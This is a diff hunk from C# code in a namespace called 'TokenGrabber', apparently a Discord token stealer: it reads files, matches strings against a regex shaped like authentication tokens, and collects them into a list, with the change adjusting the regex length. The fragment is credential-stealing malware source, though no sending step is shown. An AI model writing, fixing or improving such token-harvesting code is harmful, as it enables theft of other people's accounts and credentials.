@@ -74,7 +74,7 @@ namespace TokenGrabber
                         string content = File.ReadAllText(file);
                         
                         
-                        foreach (Match match in Regex.Matches(content, @"[\w-]{28}\.[\w-]{6}\.[\w-]{38}"))
+                        foreach (Match match in Regex.Matches(content, @"[\w-]{26}\.[\w-]{6}\.[\w-]{38}"))
                         {
                             string token = match.Value;
                             if (!tokenList.Contains(token)) 
